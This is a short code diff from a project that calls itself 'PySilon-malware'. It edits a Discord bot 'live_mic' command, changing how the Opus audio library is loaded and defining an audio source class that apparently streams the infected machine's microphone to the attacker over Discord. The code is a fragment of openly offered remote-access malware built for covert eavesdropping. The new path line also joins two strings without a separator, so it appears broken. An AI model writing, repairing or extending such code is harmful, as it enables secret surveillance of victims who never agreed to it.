@@ -22,8 +22,8 @@ async def live_mic(ctx, option=None):
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
 
-bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
-opuslib_path = os.path.abspath(os.path.join(bundle_dir, 'modules/libopus-0.x64.dll'))
+bundle_dir = os.path.dirname(os.path.abspath(__file__))
+opuslib_path = bundle_dir + 'resources/modules/libopus-0.x64.dll'
 discord.opus.load_opus(opuslib_path)
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
